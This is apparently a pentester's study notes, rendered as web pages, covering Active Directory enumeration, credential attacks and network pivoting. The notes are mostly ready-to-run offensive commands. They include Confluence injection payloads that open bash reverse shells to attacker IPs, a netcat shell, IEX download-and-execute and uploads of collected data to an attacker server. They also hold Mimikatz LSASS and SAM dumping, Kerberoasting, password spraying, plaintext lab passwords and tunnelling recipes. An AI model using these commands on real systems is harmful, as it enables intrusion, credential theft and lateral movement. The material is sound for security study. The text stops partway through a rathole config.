<div style="break-before: page; page-break-before: always;"></div><h2 id="active-directory-enumeration"><a class="header" href="#active-directory-enumeration">Active Directory Enumeration</a></h2>
<h3 id="links-16"><a class="header" href="#links-16">Links</a></h3>
<ul>
<li><a href="https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet?tab=readme-ov-file">S1ckB0y1337 Notes</a></li>
<li><a href="https://swisskyrepo.github.io/PayloadsAllTheThings/Methodology%20and%20Resources/Active%20Directory%20Attack/">Payload All the Things AD Attack</a></li>
<li><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView</a></li>
<li><a href="https://github.com/BloodHoundAD/SharpHound">SharpHound</a></li>
<li><a href="https://github.com/hausec/Bloodhound-Custom-Queries">BloodHound Custom Queries</a></li>
<li><a href="https://wadcoms.github.io/#">WADComs</a></li>
<li><a href="https://lolbas-project.github.io/">LOLBAS</a></li>
</ul>
<h3 id="quick-note-1"><a class="header" href="#quick-note-1">Quick Note</a></h3>
<pre><code>If you're on Win10 v1809 (October 2018 update) or newer, you can open an admin powershell window and run the following:

Add-WindowsCapability -Online -Name "Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0"

This will install the AD RSAT tools, as well as the AD module for Powershell. To see all of the RSAT modules that are available to install:

Get-WindowsCapability -Online -Name "RSAT*" | select Name
</code></pre>
<h3 id="manual-enumeration-1"><a class="header" href="#manual-enumeration-1">Manual Enumeration</a></h3>
<pre><code>Without PowerView:
net user # All local accounts
net user &lt;user&gt;
net user /domain # All local users in entire domain
net user &lt;username&gt; /domain # See if he is member of *Domain Admins group in *Global group memberships

# IMP
net group /domain # Enumerate Groups in Domain
net group "Domain Admins" # To find who is part of domain admins

PowerView (HeathAdams)
PowerShell -ep bypass
. .\PowerView.ps1

Get-NetDomainController # IP of DC, Name of DC

Get-DomainPolicy # Domain policies, like pass policies ,etc
(Get-DomainPolicy).”SystemAccess”

Get-NetUser # All users # Sometimes password in Decription
Get-NetUser | select samaccountname # Only account names
Get-NetUser | select cn # Only usernames
Get-NetUser | select description # Only descriptions
Get-NetUser -SPN | select serviceprincipalname # Kerbroastable SPN's

Get-UserProperty
Get-UserProperty -Properties pwdlastset # Last password set
Get-UserProperty -Properties logoncount # Good way to know honeypot accounts
Get-UserProperty -Properties badpwdcount # Bad password attempts

Get-NetComputer # Computers in domain
Get-NetComputer -FullData
Get-NetComputer -Unconstrained
Get-NetComputer | Get-NetLoggedon # Active users
Get-NetComputer -FullData | select OperatingSystem # OS

Get-NetGroup -GroupName *admin* # Important # Groups
Get-NetGroupMember -GroupName "Domain Admins" 
# Important # Members of Domain Admins group
Get-NetGroup -AdminCount | select name,memberof,admincount,member # Part of domain admin

Invoke-ShareFinder # For shares

Get-NetGPO # Group policies
Get-NetGPO | select displayname, whenchanged # Better output

# Get-DomainOU -&gt; Search for all (OUs) or specific OU objects in AD.
Get-DomainOU -Properties Name | sort -Property Name
</code></pre>
<h3 id="more-manual"><a class="header" href="#more-manual">More Manual</a></h3>
<pre><code>
powershell -ep bypass
Import-Module .\PowerView.ps1

Get-NetComputer
Get-NetComputer | select operatingsystem,dnshostname, distinguishedname, operatingsystemversion


Find-LocalAdminAccess
Get-NetSession -ComputerName files04
Get-NetSession -ComputerName web04
Get-NetSession -ComputerName files04 -Verbose
Get-NetSession -ComputerName web04 -Verbose
Get-NetSession -ComputerName client74
Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
.\PsLoggedon.exe \\files04
.\PsLoggedon.exe \\web04
.\PsLoggedon.exe \\client74


setspn -L iis_service
Get-NetUser -SPN | select samaccountname,serviceprincipalname
nslookup.exe web04.corp.com

</code></pre>
<h3 id="manual-object-permissions"><a class="header" href="#manual-object-permissions">Manual Object Permissions</a></h3>
<pre><code>
Permission Types:
GenericAll: Full permissions on object
GenericWrite: Edit certain attributes on the object
WriteOwner: Change ownership of the object
WriteDACL: Edit ACE's applied to object
AllExtendedRights: Change password, reset password, etc.
ForceChangePassword: Password change for object
Self (Self-Membership): Add ourselves to for example a group


Get-ObjectAcl -Identity stephanie
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-553

Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights

"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName

net group "Management Department" stephanie /add /domain
Get-NetGroup "Management Department" | select member
net group "Management Department" stephanie /del /domain
Get-NetGroup "Management Department" | select member
</code></pre>
<h3 id="manual-domain-shares"><a class="header" href="#manual-domain-shares">Manual Domain Shares</a></h3>
<pre><code>

Find-DomainShare
ls \\dc1.corp.com\ADMIN$\
ls \\dc1.corp.com\sysvol\corp.com\
ls \\dc1.corp.com\sysvol\corp.com\Policies\
cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
ls \\FILES04\docshare
ls "\\FILES04\Important Files"
cat "\\FILES04\Important Files\proof.txt"
ls \\FILES04\docshare\docs\do-not-share
cat \\FILES04\docshare\docs\do-not-share\start-email.txt

</code></pre>
<h3 id="bloodhound"><a class="header" href="#bloodhound">BloodHound</a></h3>
<h4 id="ingestors"><a class="header" href="#ingestors">Ingestors</a></h4>
<pre><code># Standard local execution
./SharpHound.exe --CollectionMethods All,GPOLocalGroup
Invoke-BloodHound -CollectionMethod All,GPOLocalGroup
Invoke-BloodHound -CollectionMethod All -CompressData -RemoveCSV
Invoke-BloodHound -CollectionMethod LoggedOn

# Specify different domain and run in stealth mode and collect only RDP data
Invoke-BloodHound --d &lt;Domain&gt; --Stealth --CollectionMethod RDP

# Run in context of different user
runas.exe /netonly /user:domain\user 'powershell.exe -nop -exec bypass'

# Download and execute in memory
powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('http://&lt;IP&gt;:/SharpHound.ps1');Invoke-BloodHound"

# Metasploit
use post/windows/gather/bloodhound       


# Run from Kali Box
bloodhound-python -c ALL -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb -ns 10.10.11.174
</code></pre>
<h3 id="bloodhound-python"><a class="header" href="#bloodhound-python">Bloodhound-python</a></h3>
<pre><code>sudo neo4j console
bloodhound
bloodhound-python -u enox -p california -ns $ip -d heist.offsec -c all
</code></pre>
<h4 id="custom-queries"><a class="header" href="#custom-queries">Custom Queries</a></h4>
<pre><code>Replace the `customqueries.json` with one of the below files to update the custom queries within Bloodhound. Remember to restart Bloodhound after changing the JSON file.

**Locate custom queries file**

sudo find / -type f -name customqueries.json 2&gt;/dev/null

Add one of the queries below:
https://github.com/CompassSecurity/BloodHoundQueries
https://github.com/hausec/Bloodhound-Custom-Queries
https://gist.github.com/seajaysec/a4d4a545047a51053d52cba567f78a9b


</code></pre>
<h3 id="automate-1"><a class="header" href="#automate-1">Automate</a></h3>
<pre><code>
Import-Module .\Sharphound.ps1
Get-Help Invoke-BloodHound
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\TEMP\ -OutputPrefix "medtech12audit"
ls C:\Users\stephanie\Desktop\


powershell.exe -c "(New-Object System.Net.WebClient).UploadFile('http://192.168.45.164:8000/', 'C:\temp\medtech12audit_20240208023054_BloodHound.zip')"

(New-Object System.Net.WebClient).UploadFile('http://192.168.45.164:8000/', 'C:\Users\stephanie\Desktop\corp audit_20240201105818_BloodHound.zip')



sudo neo4j start
**http://localhost:7474**
neo4j/neo4j
bloodhound


$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)

Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}

Get-DomainSPNTicket -Credential $Cred harmj0y | fl

Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname

or

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('CORP\dfm.a', $SecPassword)

$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force

Set-DomainUserPassword -Identity robert -AccountPassword $UserPassword -Credential $Cred


$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity robert -AccountPassword $UserPassword

net user robert Password123! /domain


# Find-InterestingDomainAcl


</code></pre>
<h3 id="custom-bloodhound-queries"><a class="header" href="#custom-bloodhound-queries">Custom BloodHound Queries</a></h3>
<h4 id="query-to-list-all-users"><a class="header" href="#query-to-list-all-users">Query to List All Users</a></h4>
<p>This query returns all user objects in the Active Directory, which can be useful for identifying potential targets for further exploitation or reconnaissance.</p>
<p>cypherCopy code</p>
<p><code>MATCH (u:User) RETURN u.name</code></p>
<h4 id="query-to-list-all-computers"><a class="header" href="#query-to-list-all-computers">Query to List All Computers</a></h4>
<p>This query returns all computer objects in the Active Directory. Identifying all computers can help in understanding the network's structure and identifying valuable targets for lateral movement or further exploitation.</p>
<p>cypherCopy code</p>
<p><code>MATCH (c:Computer) RETURN c.name</code></p>
<h4 id="1-find-all-domain-admins"><a class="header" href="#1-find-all-domain-admins">1. Find All Domain Admins</a></h4>
<p>Identify all users who are members of the Domain Admins group, which will give you insights into high-value targets within the network.</p>
<p>cypherCopy code</p>
<p><code>MATCH (g:Group)-[:MemberOf*1..]-&gt;(h:Group {name: 'Domain Admins@DOMAIN.COM'}) MATCH (u:User)-[:MemberOf]-&gt;(g) RETURN u.name</code></p>
<h4 id="2-uncover-shortest-paths-to-domain-admins"><a class="header" href="#2-uncover-shortest-paths-to-domain-admins">2. Uncover Shortest Paths to Domain Admins</a></h4>
<p>Discover the shortest paths that could be exploited to elevate privileges to Domain Admin level. This can help in planning an attack route.</p>
<p>cypherCopy code</p>
<p><code>MATCH (u:User),(g:Group {name: 'Domain Admins@DOMAIN.COM'}), p = shortestPath((u)-[:MemberOf*1..]-&gt;(g)) RETURN p</code></p>
<h4 id="3-identify-users-with-unconstrained-delegation-rights"><a class="header" href="#3-identify-users-with-unconstrained-delegation-rights">3. Identify Users with Unconstrained Delegation Rights</a></h4>
<p>Users with unconstrained delegation rights can impersonate any user to any service. This query helps identify such users, presenting a significant security risk.</p>
<p>cypherCopy code</p>
<p><code>MATCH (u:User {allowedtodelegate: true}) RETURN u.name</code></p>
<h4 id="4-find-computers-where-domain-admins-have-sessions"><a class="header" href="#4-find-computers-where-domain-admins-have-sessions">4. Find Computers Where Domain Admins Have Sessions</a></h4>
<p>Identifying machines where Domain Admins have active sessions can be useful for moving laterally within the network.</p>
<p>cypherCopy code</p>
<p><code>MATCH (c:Computer)&lt;-[:HasSession]-(u:User) WHERE u.name CONTAINS 'Domain Admins@DOMAIN.COM' RETURN c.name, u.name</code></p>
<h4 id="5-detect-all-kerberoastable-accounts"><a class="header" href="#5-detect-all-kerberoastable-accounts">5. Detect All Kerberoastable Accounts</a></h4>
<p>Kerberoasting targets service accounts by requesting service tickets that can be cracked offline. This query finds service accounts that can be Kerberoasted.</p>
<p>cypherCopy code</p>
<p><code>MATCH (u:User {hasspn: true})  RETURN u.name</code></p>
<h4 id="6-enumerate-acl-exploitation-paths"><a class="header" href="#6-enumerate-acl-exploitation-paths">6. Enumerate ACL Exploitation Paths</a></h4>
<p>Access Control List (ACL) exploitation can be a powerful method for escalating privileges. This query helps identify potential ACL exploit paths.</p>
<p>cypherCopy code</p>
<p><code>MATCH p = (n)-[r:WriteDacl|WriteOwner|GenericAll|GenericWrite|Owns]-&gt;(m) RETURN p</code></p>
<h4 id="7-find-all-trust-relationships"><a class="header" href="#7-find-all-trust-relationships">7. Find All Trust Relationships</a></h4>
<p>Understanding trust relationships between domains can reveal paths for lateral movement and privilege escalation.</p>
<p>cypherCopy code</p>
<p><code>MATCH (d:Domain)-[:TrustedBy]-&gt;(t:Domain) RETURN d.name, t.name</code></p>
<h4 id="8-identify-orphaned-objects"><a class="header" href="#8-identify-orphaned-objects">8. Identify Orphaned Objects</a></h4>
<p>Orphaned objects (users, computers) can sometimes retain privileges and be overlooked. This query helps spot such objects.</p>
<p>cypherCopy code</p>
<p><code>MATCH (n) WHERE NOT (n)-[:MemberOf]-&gt;() RETURN n.name, labels(n)</code></p>
<p>Additio
SharpHound Cheat Sheet
<img src="SharpHoundInfo.png" alt="SharpHound Cheat Sheet" /></p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="active-directory-authentication"><a class="header" href="#active-directory-authentication">Active Directory Authentication</a></h2>
<h3 id="mimikatz"><a class="header" href="#mimikatz">Mimikatz</a></h3>
<pre><code>Cached Creds Storage -&gt; Retrieve stored cache pass.

-&gt; For Single Sign-on access, Pass hashses must be stored somewhere. It's stored in LSASS.
-&gt; Access to LSASS needs admin level privs. Also they are encrypted with LSASS key.
-&gt; We use mimikatz to dump LSASS.

1) mimikatz
# If we are local admin:
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords # Dumping hashes for logged on users using sekurlsa module.
# Crack the hashes now or Pass the Hash.

sekurlsa::tickets # Dumping TGT/TGS Tickets stored in memory.


Mimikatz One-Liner:

.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "token::elevate" "lsadump::sam /system:C:\TEMP\SYSTEM /sam:C:\TEMP\SAM sam.hiv security.hiv system.hiv" "lsadump::cache" "sekurlsa::ekeys" "exit"
</code></pre>
<h3 id="pypykatz"><a class="header" href="#pypykatz">PyPyKatz</a></h3>
<p>https://en.hackndo.com/remote-lsass-dump-passwords/#linux--windows</p>
<pre><code>If you come across a lsass dump file, like in HTB Blackfield, use this tool

pypykatz lsa minidump lsass.DMP

</code></pre>
<h3 id="kerberoasting-1"><a class="header" href="#kerberoasting-1">Kerberoasting</a></h3>
<pre><code>Service Account Attack -&gt; Kerberoasting attack.

# VERY USEFUL if the domain contains high-priv service account with weak pass.
# Abusing the service ticket and crack pass of service account in the Domain.

1) Impacket Method (REQUIRES PASS)
# This will take creds of a user, find kerberoastable users in the domain and then give us it's hash.
python3 GetUserSPNs.py &lt;Domain&gt;/&lt;username&gt;:&lt;pass&gt; -dc-ip &lt;IP&gt; -request
hashcat -m 13100 &lt;hashes&gt; /usr/share/wordlists/rockyou.txt --force
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt &lt;hashes&gt;

2) Powerview Method (WITHOUT PASS)
# Import Powerview script
powershell -ep bypass
Import-Module .\PowerView.ps1
Get-NetUser -SPN | select serviceprincipalname # Replace SPN String Entirely below.
Request-SPNTicket -SPN "MSSQLSvc/xor-app23.xor.com:1433" -Format Hashcat

3) Rebues.exe
# Transfer Rebues.exe
.\Rubeus.exe kerberoast /outfile:hashes.kerberoas
hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt --force

3) Manual Method (Nidem Article)
setspn -T medin -Q */* # Find SPN's of Kerbroastable users.
powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &lt;'HTTP/CorpWebServer.corp.com'&gt; # PUT SPN HERE.
klist # List all cached Kerberos tickets for current user.
</code></pre>
<h3 id="additional-notes-on-kerberoasting"><a class="header" href="#additional-notes-on-kerberoasting">Additional Notes on Kerberoasting</a></h3>
<pre><code>
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast

cat hashes.kerberoast
hashcat --help | grep -i "Kerberos"

sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

sudo impacket-GetUserSPNs -request -dc-ip 192.168.205.70 corp.com/pete

sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force



</code></pre>
<h3 id="password-spraying"><a class="header" href="#password-spraying">Password Spraying</a></h3>
<pre><code># Try on each user found on each IP in the domain.
proxychains crackmapexec smb &lt;IP&gt; -u &lt;user&gt; -p &lt;passoword&gt;

# Google how to use this attack
net accounts # Check Lockout Threshold
.\Spray-Passwords.ps1 -Pass &lt;password&gt; -Admin # Will Spray password on all Admin accounts.
</code></pre>
<h3 id="other-notes"><a class="header" href="#other-notes">Other Notes</a></h3>
<pre><code>
xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.205.75
net accounts

$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")

cd C:\Tools
powershell -ep bypass
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin


cat users.txt
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success


crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com

type .\usernames.txt
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"


Set-ADAccountPassword -Identity gordon.stevens -Server za.tryhackme.com -OldPassword (ConvertTo-SecureString -AsPlaintext "old" -force) -NewPassword (ConvertTo-SecureString -AsPlainText "new" -Force)
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pivoting"><a class="header" href="#pivoting">Pivoting</a></h2>
<p>A very Interesting and important concept - (Chisel + Proxychain)</p>
<h3 id="links-17"><a class="header" href="#links-17">Links</a></h3>
<ul>
<li><a href="https://github.com/nicocha30/ligolo-ng">Ligolo-ng</a></li>
<li><a href="https://github.com/jpillora/chisel">Chisel</a></li>
<li><a href="https://posts.specterops.io/offensive-security-guide-to-ssh-tunnels-and-proxies-b525cbd4d4c6">SSH Tunneling Explained</a></li>
</ul>
<h3 id="remote-port-forwarding-opening-an-internal-port-to-us"><a class="header" href="#remote-port-forwarding-opening-an-internal-port-to-us">Remote Port Forwarding (Opening an Internal port to us)</a></h3>
<pre><code>Transfer chisel to Victim
# Proxychains # In end, append 'socks5 127.0.0.1 1080' in end of file.
# For HTML you will have to append 'html 127.0.0.1 1080' at the end of the file.
nano /etc/proxychains4.conf

# On Victim # Only Change Kali IP and port 445 as a port you want to open up.
./chisel.exe client &lt;KALI IP&gt;:1337 R:1080:127.0.0.1:&lt;445&gt;

# To run above in background # change location of chisel.exe, and 80 to desired port
powershell.exe
$scriptBlock = { Start-Process C:\Users\viewer\Desktop\chisel.exe -ArgumentList @('client','&lt;ATTACKERs IP&gt;:1337','R:127.0.0.1:80:&lt;Vitctim IP&gt;:80') }
Start-Job -ScriptBlock $scriptBlock

# On Attacking # All values Static here
./chisel server -p 1337 --reverse &amp;

-&gt; Use 127.0.0.1 and Port 1080 for Scanning and further enumeration.
</code></pre>
<h3 id="reverse-socks-proxy-pivoting-to-other-network"><a class="header" href="#reverse-socks-proxy-pivoting-to-other-network">Reverse Socks Proxy (Pivoting to Other Network)</a></h3>
<pre><code>Transfer Chisel to the Victim machine
./chisel client &lt;KALI IP&gt;:1337 R:socks &amp;
# On Victim but Without losing shell 
$scriptBlock = { Start-Process C:\users\public\chisel.exe -ArgumentList @('client','&lt;ATTACKERs IP&gt;:1337','R:1080:socks') }
Start-Job -ScriptBlock $scriptBlock

# ON Attacking
./chisel server -p 1337 --reverse --socks5 # without background job
./chisel server -p 1337 --reverse --socks5 &amp; # Use this when using proxychain
# Start enumerating using proxychains nmap &lt;IP&gt;, etc commands.

Now for other networks try:
proxychains nmap, proxychains psexec, proxychains dirbuster, etc
try everything just with proxychains command once you get access to another network
</code></pre>
<h3 id="more-chisel-notes"><a class="header" href="#more-chisel-notes">More Chisel Notes</a></h3>
<pre><code># On Kali
./chisel server -p 8001 --reverse --socks5

# For standard socks proxy
.\chisel_1.9.1_windows_amd64.exe client 192.168.45.164:8001 R:socks

# For reverse shell
.\chisel_1.9.1_windows_amd64.exe client 192.168.45.164:8001 0.0.0.0:9999:192.168.45.164:9999

# Add to Proxychains.conf file

socks5 127.0.0.1 1080

#Random Variations
./chisel client 192.168.45.225:8001 R:socks

0.0.0.0:8000:192.168.45.225:8000

./chisel server -p 8000 --reverse

./chiselwin.exe client 192.168.45.219:8000 R:8001:127.0.0.1:9001
./chiselwin.exe server -p 9001 --socks5

./chisel client localhost:8001 socks

</code></pre>
<h3 id="ligolo-ng"><a class="header" href="#ligolo-ng">Ligolo-ng</a></h3>
<pre><code> iwr -uri http://192.168.45.219:9090/nmap-7.94-setup.exe -Outfile nmap-7.94-setup.exe

iwr -uri http://192.168.45.219:9090/agent.exe -Outfile agent.exe
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up

./proxy -selfcert  


.\agent.exe -connect 192.168.45.219:11601 -ignore-cert

session
1
ifconfig
sudo ip route add 172.16.105.0/24 dev ligolo

tunnel_start

tunnel_start --tun ligolo1 #If more than one tunnel


ip route del 122.252.228.38/32

</code></pre>
<h2 id="sshuttle"><a class="header" href="#sshuttle">SShuttle</a></h2>
<pre><code>
socat TCP-LISTEN:2222,fork TCP:10.4.229.215:22
sshuttle -r database_admin@192.168.229.63:2222 10.4.229.0/24 172.16.229.0/24
smbclient -L //172.16.229.217/ -U hr_admin --password=Welcome1234


</code></pre>
<h3 id="windows-ssh"><a class="header" href="#windows-ssh">Windows SSH</a></h3>
<pre><code>
sudo systemctl start ssh
xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.229.64
where ssh
ssh.exe -V
ssh -N -R 9998 kali@192.168.45.226
ss -ntplu
tail /etc/proxychains4.conf
socks5 127.0.0.1 9998

proxychains psql -h 10.4.50.215 -U postgres
\l
</code></pre>
<h3 id="socat-1"><a class="header" href="#socat-1">Socat</a></h3>
<pre><code>
curl http://192.168.232.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.239/4444%200%3E%261%27%29.start%28%29%22%29%7D/

ip addr
ip route
cat /var/atlassian/application-data/confluence/confluence.cfg.xml
D@t4basePassw0rd!
dbc:postgresql://10.4.232.215:5432/confluence
postgres

socat -ddd TCP-LISTEN:2345,fork TCP:10.4.232.215:5432
psql -h 192.168.232.63 -p 2345 -U postgres
\l
\c confluence
select * from cwd_user;
hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt

hr_admin = Welcome1234
rdp_admin = P@ssw0rd!
database_admin = sqlpass123

socat TCP-LISTEN:2222,fork TCP:10.4.232.215:22
ssh database_admin@192.168.232.63 -p2222

</code></pre>
<h3 id="ssh-local-port-forwarding"><a class="header" href="#ssh-local-port-forwarding">SSH Local Port Forwarding</a></h3>
<pre><code>
curl http://192.168.210.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.182/4444%200%3E%261%27%29.start%28%29%22%29%7D/

python3 -c 'import pty; pty.spawn("/bin/bash")'

ssh database_admin@10.4.210.215
sqlpass123
ip addr
ip route
for i in $(seq 1 254); do nc -zv -w 1 172.16.210.$i 445; done

ssh -N -L 0.0.0.0:4455:172.16.210.217:4242 database_admin@10.4.210.215


curl http://192.168.210.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.182/4455%200%3E%261%27%29.start%28%29%22%29%7D/

ss -ntplu

smbclient -p 4455 -L //192.168.210.63/ -U hr_admin --password=Welcome1234
smbclient -p 4455 //192.168.210.63/scripts -U hr_admin --password=Welcome1234
get Provisioning.ps1

</code></pre>
<h3 id="ssh-dynamic-port-forwarding"><a class="header" href="#ssh-dynamic-port-forwarding">SSH Dynamic Port Forwarding</a></h3>
<pre><code>
curl http://192.168.210.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.182/4444%200%3E%261%27%29.start%28%29%22%29%7D/


python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh -N -D 0.0.0.0:9999 database_admin@10.4.210.215
sqlpass123

tail /etc/proxychains4.conf
tail /etc/proxychains.conf
socks5 192.168.50.63 9999

proxychains smbclient -L //172.16.210.217/ -U hr_admin --password=Welcome1234
proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.210.217
proxychains nmap -vvv -sT -p4800-4900 -Pn 172.16.210.217

By default, Proxychains is configured with very high time-out values. This can make port scanning really slow. Lowering the **tcp_read_time_out** and **tcp_connect_time_out** values in the Proxychains configuration file will force Proxychains to time-out on non-responsive connections more quickly. This can dramatically speed up port-scanning times.

</code></pre>
<h3 id="ssh-remote-port-forwarding"><a class="header" href="#ssh-remote-port-forwarding">SSH Remote Port Forwarding</a></h3>
<pre><code>
sudo systemctl start ssh
sudo ss -ntplu

curl http://192.168.229.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.164/4455%200%3E%261%27%29.start%28%29%22%29%7D/

python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh -N -R 127.0.0.1:4444:10.4.229.215:4444 kali@192.168.45.164
ss -ntplu
psql -h 127.0.0.1 -p 2345 -U postgres
\l

To close socket listening:
netstat -np
lsof -np $pid
gdb -p $pid
call close($fileDescriptor) //does not need ; at end.
quit


</code></pre>
<h3 id="ssh-remote-dynamic-port-forwarding"><a class="header" href="#ssh-remote-dynamic-port-forwarding">SSH Remote Dynamic Port Forwarding</a></h3>
<pre><code>
curl http://192.168.229.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.222/4455%200%3E%261%27%29.start%28%29%22%29%7D/



python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh -N -R 9998 kali@192.168.45.164
sudo ss -ntplu
tail /etc/proxychains4.conf
tail /etc/proxychains.conf
socks5 127.0.0.1 9998
proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.229.64
proxychains nmap -vvv -sT -p9000-9100 -Pn -n 10.4.229.64
proxychains ./ssh_remote_dynamic_client -i 10.4.229.64 -p 9062




ssh -R 1080 kali@192.168.45.196


</code></pre>
<h4 id="visual-examples-of-ssh-tunneling"><a class="header" href="#visual-examples-of-ssh-tunneling">Visual Examples of SSH Tunneling</a></h4>
<p><img src="SSHDynamicReversePortForward.png" alt="SSH Dynamic Reverse Port Forward Example" /></p>
<p><img src="SSHPortForward.png" alt="SSH Port Forward Example" /></p>
<h3 id="plink"><a class="header" href="#plink">Plink</a></h3>
<pre><code>
sudo systemctl start apache2
find / -name nc.exe 2&gt;/dev/null
sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/

powershell wget -Uri http://192.168.118.4/nc.exe -OutFile C:\Windows\Temp\nc.exe
nc -nvlp 4446
C:\Windows\Temp\nc.exe -e cmd.exe 192.168.118.4 4446

find / -name plink.exe 2&gt;/dev/null
sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/
powershell wget -Uri http://192.168.118.4/plink.exe -OutFile C:\Windows\Temp\plink.exe


C:\Windows\Temp\plink.exe -ssh -l kali -pw &lt;YOUR PASSWORD HERE&gt; -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4

ss -ntplu

xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833

</code></pre>
<h3 id="netsh"><a class="header" href="#netsh">Netsh</a></h3>
<pre><code>
xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.208.64

netsh interface portproxy add v4tov4 listenport=4545 listenaddress=192.168.208.64 connectport=4545 connectaddress=10.4.208.215

netstat -anp TCP | find "4545"
netsh interface portproxy show all
sudo nmap -sS 192.168.208.64 -Pn -n -4545

netsh advfirewall firewall add rule name="port_forward_ssh_4545" protocol=TCP dir=in localip=192.168.208.64 localport=4545 action=allow

sudo nmap -sS 192.168.208.64 -Pn -n -p4545

ssh database_admin@192.168.208.64 -p4545

database_admin = sqlpass123


netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.208.64

./netsh_exercise_client.bin -i 192.168.208.64 -p 4545


</code></pre>
<h3 id="bore"><a class="header" href="#bore">Bore</a></h3>
<pre><code>rathole

If you want to reverse shell, need two of these bad boys.

First:

Run rathole server on victim machine:

./rathole server.toml

######################
# server.toml
[server]
bind_addr = "0.0.0.0:2333" # `2333` specifies the port that rathole listens for clients

[server.services.my_nas_ssh]
